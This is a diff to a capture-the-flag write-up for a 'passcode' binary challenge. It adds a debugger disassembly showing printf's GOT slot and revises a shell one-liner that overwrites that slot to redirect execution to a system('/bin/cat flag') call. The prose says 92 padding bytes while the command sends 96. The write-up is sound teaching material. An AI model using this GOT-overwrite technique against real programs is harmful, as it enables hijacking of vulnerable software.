@@ -377,7 +377,17 @@ Relocation section '.rel.plt' at offset 0x440 contains 10 entries:
 0804c030  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
 No processor specific unwind information to decode
 ```
-- a lot to choose from, lets try printf (0x0804c010)
+- a lot to choose from, lets try printf
+```bash
+pwndbg> disass printf
+Dump of assembler code for function printf@plt:
+   0x08049050 <+0>:     jmp    DWORD PTR ds:0x804c010
+   0x08049056 <+6>:     push   0x8
+   0x0804905b <+11>:    jmp    0x8049030
+End of assembler dump.
+pwndbg> 
+```
+- since printf jumps to the address 0x804c010, lets overwrite there
 - now we need to figure out what we want to overwrite it with
     - an idea is where the program calls system(/bin/cat flag)
 ```bash
@@ -414,7 +424,7 @@ enter passcode1 : Now I can safely trust you that you have credential :)
 - 0x0804928f = 134517391
 - so our payload will be "A"*92 + '\x10\xc0\x04\x08' + '134517391'
 ```bash
-passcode@ubuntu:~$ ( printf '%s' "$(printf '\x01%.0s' {1..96})"; printf '\x10\xc0\x04\x08'; printf '134517391' ) | ./passcode
+passcode@ubuntu:~$ ( printf "$(printf '\x01%.0s' {1..96})"; printf '\x10\xc0\x04\x08'; printf '134517391' ) | ./passcode
 Toddler's Secure Login System 1.1 beta.
 enter you name : Welcome !
 enter passcode1 : Login OK!
